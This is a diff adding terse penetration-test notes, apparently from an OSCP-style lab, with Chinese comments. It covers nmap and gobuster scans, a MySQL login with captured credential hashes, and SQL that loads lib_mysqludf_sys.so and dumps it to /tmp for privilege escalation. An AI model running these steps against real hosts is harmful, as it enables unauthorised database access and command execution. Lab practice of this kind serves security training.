@@ -1,0 +1,20 @@
+nmap 192.168.23.106 -sC -sV -Pn > nmap.txt
+nmap 192.168.23.106 -p- > nmapall.txt
+
+gobuster dir  -u http://192.168.23.106/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,cgi -t50 > gobuster.txt
+
+
+1.發現mariadb可以登入,但無東西且不能遠程執行命令
+2.80首頁檔案全都載下來,查看帳號密碼
+
+017c09fa7b4c2bb8ff91c9a54bab3fe7
+mysql -u bookstack -h 192.168.23.106  -p
+SHOW GRANTS
+GRANT USAGE ON *.* TO 'bookstack'@'%' IDENTIFIED BY PASSWORD '*11F28B3BE79A0170A84A4816B4DF3517EBAD71EA' |
+GRANT ALL PRIVILEGES ON `bookstack`.* TO 'bookstack'@'%'
+
+insert into potato values(load_file('/home/kali/timmy/oscpexam2/192.168.23.106/lib_mysqludf_sys.so'));
+
+select * from potato into dumpfile '/tmp/lib_mysqludf_sys.so';
+
+wget -r http://192.168.23.103/
